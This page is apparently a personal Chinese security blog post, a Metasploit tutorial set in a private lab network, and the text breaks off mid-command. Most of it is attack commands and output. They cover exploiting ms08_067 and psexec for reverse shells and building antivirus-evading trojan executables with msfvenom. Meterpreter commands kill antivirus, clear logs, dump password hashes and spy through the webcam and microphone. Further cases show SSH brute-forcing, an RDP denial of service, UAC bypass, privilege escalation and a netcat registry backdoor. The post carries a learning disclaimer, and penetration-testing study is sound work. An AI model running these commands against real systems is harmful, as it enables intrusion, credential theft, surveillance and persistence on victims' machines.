154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">MSF的简单操作</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-08-18 15:47:41" itemprop="dateCreated datePublished" datetime="2020-08-18T15:47:41+08:00">2020-08-18</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-08-18 18:27:30" itemprop="dateModified" datetime="2020-08-18T18:27:30+08:00">2020-08-18</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a> </span></span><span id="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/" class="post-meta-item leancloud_visitors" data-flag-title="MSF的简单操作" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>13k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>12 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01.写在前面"></a>0x01.写在前面</h1><blockquote><p><strong>Metasploit项目</strong>是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收费版本，但功能也更加强大。最新的MSF为MSF5.0，5.0提供了新的数据服务，引入了新的免杀功能，支持多种语言。</p></blockquote><p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p><a id="more"></a><h2 id="一、MSF5的7大模块"><a href="#一、MSF5的7大模块" class="headerlink" title="一、MSF5的7大模块"></a>一、MSF5的7大模块</h2><hr><h3 id="1-auxiliary"><a href="#1-auxiliary" class="headerlink" title="1.auxiliary"></a>1.auxiliary</h3><blockquote><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p></blockquote><h3 id="2-exploits"><a href="#2-exploits" class="headerlink" title="2.exploits"></a>2.exploits</h3><blockquote><p>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p></blockquote><h3 id="3-payloads"><a href="#3-payloads" class="headerlink" title="3.payloads"></a>3.payloads</h3><blockquote><p>成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p><p>single：一个完整的payload，不需要外部库，all-in-one</p><p>stager：目标计算机内存有限，先传输一个较小的payload用于建立连接</p><p>stages：利用stager建立的连接下载后续的payload</p><p>stager与stages有多种类型，适用于不同场景</p></blockquote><h3 id="4-encoders"><a href="#4-encoders" class="headerlink" title="4.encoders"></a>4.encoders</h3><blockquote><p>对payload进行加密，躲避Anti Virus检查的模块</p></blockquote><h3 id="5-nops"><a href="#5-nops" class="headerlink" title="5.nops"></a>5.nops</h3><blockquote><p>提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</p></blockquote><h3 id="6-post"><a href="#6-post" class="headerlink" title="6.post"></a>6.post</h3><blockquote><p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作</p></blockquote><h3 id="7-evasion"><a href="#7-evasion" class="headerlink" title="7.evasion"></a>7.evasion</h3><blockquote><p>用于免杀绕过</p></blockquote><h2 id="二、msfconsole控制台"><a href="#二、msfconsole控制台" class="headerlink" title="二、msfconsole控制台"></a>二、msfconsole控制台</h2><p>一般参数</p><blockquote><p>msfconsole -h 查看帮助信息</p><p>msfconsole -q 安静启动</p></blockquote><p>一般命令</p><blockquote><p>banner banner信息</p><p>color 颜色设置</p><p>connect 连接设置</p></blockquote><p>控制台常用命令</p><blockquote><p>show 模块 查看模块信息</p><p>search 参数 查找指定信息。例如：search name:mysql</p><p>use 指定文件 使用指定文件。例如：use exploit/windows/smb/ms08_067_netapi</p><p>在use下可以查看info信息，查看当前exp下可以使用的payload、系统等信息。</p><p>在use下也可以使用show missing查看需要配置的参数，show options查看配置的参数，show targets查看可以利用的对象，show advanced查看高级配置参数，show evasion查看面纱绕过信息</p><p>set/unset 用于设置</p><p>setg/unsetg 全局设置，仅在当前会话有效，退出失效，可以使用save保存</p><p>check 用于测试是否可以利用</p><p>back 返回上一级</p><p>db_ 一系列参数</p><p>hosts 查看主机参数</p><p>hosts -c 查看指定列</p><p>hosts -S 以指定参数搜索</p><p>services 查看端口等（-S/-c）</p><p>run 执行当前模块</p><p>load 导入外部模块</p><p>resource 指定资源文件 文件名.rc，将配置直接写入.rc，msfconsole -r 文件名.rc</p></blockquote><p>一个反弹shell小案例，本次利用ms08_067</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set rhost 192.168.1.200</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set target 34</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png"><h2 id="三、实验案例"><a href="#三、实验案例" class="headerlink" title="三、实验案例"></a>三、实验案例</h2><h3 id="1-active-exploit与PassiveMoudle案例"><a href="#1-active-exploit与PassiveMoudle案例" class="headerlink" title="(1)active exploit与PassiveMoudle案例"></a>(1)active exploit与PassiveMoudle案例</h3><p>ActiveModule</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search smb/psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">search shell/reverse</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set rhosts 192.168.1.100</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS 11</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure><p>PassiveMoudle</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">use windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set srvhost 192.168.1.6</span><br><span class="line">run # 等待访问即可</span><br></pre></td></tr></table></figure><h3 id="（2）生成payload案例"><a href="#（2）生成payload案例" class="headerlink" title="（2）生成payload案例"></a>（2）生成payload案例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use windows/shell_bind_tcp</span><br><span class="line">generate # 编码</span><br><span class="line">generate -b &#x27;\x00&#x27; # 过滤坏字符</span><br><span class="line">-e x86/shikata_ga_nai # 指定编码</span><br><span class="line">-i 5 # 指定编码次数</span><br><span class="line">-k # 使用当前进程，开启一个新的线程</span><br><span class="line">-x /usr/share/windows-binaries/radmin.exe # 使用一个正常的模板</span><br><span class="line">-f exe # 输出指定格式文件</span><br><span class="line">-o /root/1.exe # 输出文件的名字</span><br><span class="line">-n 14 # 添加14个字节的NOP,NOP是无任何操作字符，可以起到混淆绕过免杀的作用</span><br></pre></td></tr></table></figure><p>小案例，生成一个伪造的远程管理小程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generate -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f exe -o /root/1.exe</span><br></pre></td></tr></table></figure><p>执行</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png"><p>nc，getshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png"><h2 id="四、meterpreter，注入到合法的操作系统里的进程，随机。"><a href="#四、meterpreter，注入到合法的操作系统里的进程，随机。" class="headerlink" title="四、meterpreter，注入到合法的操作系统里的进程，随机。"></a>四、meterpreter，注入到合法的操作系统里的进程，随机。</h2><p>1.meterpreter shell 案例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">set target 34</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions 1</span><br></pre></td></tr></table></figure><p>拿到meterpreter shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png"><p>2.meterpreter shell下的常用命令，在meterpreter shell下可以使用Linux命令与Windows命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">help # 帮助</span><br><span class="line">background # 返回msfconlse，并保存session</span><br><span class="line">dir,pwd,cat,ls,mkdir,rmdir, edit,lcd,lpwd等</span><br><span class="line">bgrun killav # 杀死杀病毒软件</span><br><span class="line">bgrun vnc # 监控</span><br><span class="line">clearev # 清除日志</span><br><span class="line">download # 下载文件 download boot.ini</span><br><span class="line">upload # 上传 例如：upload /usr/share/windows-binaries/nc.exe c:</span><br><span class="line">execute # 执行 例如：execute -f cmd.exe -i -H -f为运行哪个程序 -i为交互 -H为隐藏</span><br><span class="line">getuid # 查看当前用户</span><br><span class="line">getsystem # 提权到system</span><br><span class="line">getprivs # 查看有哪些权限</span><br><span class="line">getproxy # 获取代理</span><br><span class="line">getpid # 获取进程号</span><br><span class="line">migrate 1548 # 迁移进程</span><br><span class="line">hashdump # 获取用户的哈希值</span><br><span class="line">sysinfo # 查看系统信息</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">shell # 获取shell</span><br><span class="line">show_mount # 查看挂载硬盘</span><br><span class="line">search -f ein.ini # 查找文件</span><br><span class="line">arp</span><br><span class="line">netstat</span><br><span class="line">ipcofnig</span><br><span class="line">ifconfig</span><br><span class="line">route</span><br><span class="line">idletime # 查看停止操作的时间</span><br><span class="line">resource -r 文件 # 调用资源文件</span><br><span class="line">record_mic # 麦克风</span><br><span class="line">webcam_list # 摄像头</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五、-msfcli"><a href="#五、-msfcli" class="headerlink" title="五、 msfcli"></a>五、 msfcli</h2><p>已被msfconsole -x代替，不好玩</p><p>例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;</span><br><span class="line">set rhosts 192.168.1.200;</span><br><span class="line">set target 34;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp;</span><br><span class="line">set lhost 192.168.1.6;</span><br><span class="line">run -j&quot;</span><br></pre></td></tr></table></figure><hr><hr><hr><hr><h1 id="0x02-MSF信息收集"><a href="#0x02-MSF信息收集" class="headerlink" title="0x02.MSF信息收集"></a>0x02.MSF信息收集</h1><h2 id="一、内置外部工具"><a href="#一、内置外部工具" class="headerlink" title="一、内置外部工具"></a>一、内置外部工具</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap 192.168.1.0/24</span><br></pre></td></tr></table></figure><h2 id="二、auxiliary模块"><a href="#二、auxiliary模块" class="headerlink" title="二、auxiliary模块"></a>二、auxiliary模块</h2><h3 id="例一，arp主机扫描"><a href="#例一，arp主机扫描" class="headerlink" title="例一，arp主机扫描"></a>例一，arp主机扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search arp</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">show options</span><br><span class="line">set interface eth0 # 设置网卡</span><br><span class="line">set rhosts 192.168.1.0/24 # 设置网段</span><br><span class="line">set threads 20 # 设置线程数</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例二，端口扫描"><a href="#例二，端口扫描" class="headerlink" title="例二，端口扫描"></a>例二，端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">set interface eth0</span><br><span class="line">set ports 80</span><br><span class="line">set rhosts 192.168.1.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例三，UDP扫描"><a href="#例三，UDP扫描" class="headerlink" title="例三，UDP扫描"></a>例三，UDP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><h3 id="例四，SMTP扫描"><a href="#例四，SMTP扫描" class="headerlink" title="例四，SMTP扫描"></a>例四，SMTP扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/default/snmpd #修改侦听地址  0.0.0.0</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers （windows）</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares （windows）</span><br></pre></td></tr></table></figure><h3 id="例五，SMB扫描"><a href="#例五，SMB扫描" class="headerlink" title="例五，SMB扫描"></a>例五，SMB扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">版本扫描</span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">扫描命令管道，判断SMB服务类型（账号，密码）</span><br><span class="line">use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">扫描通过SMB管道可以访问的RCERPC服务</span><br><span class="line">use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMB枚举共享</span><br><span class="line">use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMB用户枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SMB SID（RID）枚举</span><br><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h3 id="例六，SSH扫描"><a href="#例六，SSH扫描" class="headerlink" title="例六，SSH扫描"></a>例六，SSH扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SSH版本扫描</span><br><span class="line">use auxiliary/scanner/ssh/ssh_versio</span><br><span class="line"></span><br><span class="line">SSH密码爆破</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line"></span><br><span class="line">SSH公钥登入</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login_pubkey</span><br></pre></td></tr></table></figure><h1 id="0x03-MSF漏洞扫描"><a href="#0x03-MSF漏洞扫描" class="headerlink" title="0x03.MSF漏洞扫描"></a>0x03.MSF漏洞扫描</h1><h2 id="实验案例"><a href="#实验案例" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="例一，vnc密码破解"><a href="#例一，vnc密码破解" class="headerlink" title="例一，vnc密码破解"></a>例一，vnc密码破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">threads 30</span><br><span class="line">set BlANK_PASSWORDS yes</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例二，vnc无密码访问"><a href="#例二，vnc无密码访问" class="headerlink" title="例二，vnc无密码访问"></a>例二，vnc无密码访问</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set rhosts 192.168.1.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例三，RDP远程桌面漏洞"><a href="#例三，RDP远程桌面漏洞" class="headerlink" title="例三，RDP远程桌面漏洞"></a>例三，RDP远程桌面漏洞</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/ms12_020_check # 无DOS攻击</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids  # DOS攻击，蓝屏关机</span><br></pre></td></tr></table></figure><h3 id="例四，显示目录及文件"><a href="#例四，显示目录及文件" class="headerlink" title="例四，显示目录及文件"></a>例四，显示目录及文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/files_dir</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例五，WebDAV-Unicode编码身份验证绕过"><a href="#例五，WebDAV-Unicode编码身份验证绕过" class="headerlink" title="例五，WebDAV Unicode编码身份验证绕过"></a>例五，WebDAV Unicode编码身份验证绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_webdav_unicode_bypass</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="例六，wmap"><a href="#例六，wmap" class="headerlink" title="例六，wmap"></a>例六，wmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先需要load wmap</span><br><span class="line">根据sqlmap工作模式开发</span><br></pre></td></tr></table></figure><h1 id="0x04-MSF客户端渗透"><a href="#0x04-MSF客户端渗透" class="headerlink" title="0x04.MSF客户端渗透"></a>0x04.MSF客户端渗透</h1><h2 id="实验案例-1"><a href="#实验案例-1" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.6 lport=4444 -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -f exe -o what.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="0x05-后渗透测试"><a href="#0x05-后渗透测试" class="headerlink" title="0x05.后渗透测试"></a>0x05.后渗透测试</h1><h2 id="实验案例-2"><a href="#实验案例-2" class="headerlink" title="实验案例"></a>实验案例</h2><h3 id="提权，案例一"><a href="#提权，案例一" class="headerlink" title="提权，案例一"></a>提权，案例一</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST=192.168.1.6 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o</span><br><span class="line">1.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">exploit -j</span><br><span class="line">运行1.exe</span><br><span class="line"></span><br><span class="line">得到LLuna用户权限</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">基于session提权(UAC允许)</span><br><span class="line">background</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set filename winupdate.exe</span><br><span class="line">set session 1</span><br><span class="line">点击确定get shell</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: L-CD1028181A2B4\Lluna</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">绕过UAC提权，会出现Already in elevated state（已经处于提升状态）</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set session 1</span><br><span class="line"></span><br><span class="line">使用DDL动态链接库绕过</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line"></span><br><span class="line">使用漏洞提权</span><br><span class="line">use exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure><h3 id="案例二，使用注册表添加NC后门服务"><a href="#案例二，使用注册表添加NC后门服务" class="headerlink" title="案例二，使用注册表添加NC后门服务"></a>案例二，使用注册表添加NC后门服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32(上传nc)</span><br><span class="line">查看键值对</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">增加键值对</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 